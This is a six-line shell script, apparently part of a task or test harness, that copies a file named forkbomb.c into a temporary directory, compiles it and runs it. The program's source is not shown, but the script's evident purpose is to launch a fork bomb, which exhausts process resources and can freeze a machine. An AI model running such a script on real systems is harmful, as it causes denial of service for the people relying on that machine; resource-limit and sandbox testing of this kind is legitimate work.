#!/bin/sh
mkdir /tmp/work
cp /task/forkbomb.c /tmp/work/forkbomb.c
cd /tmp/work
make --silent forkbomb
./forkbomb
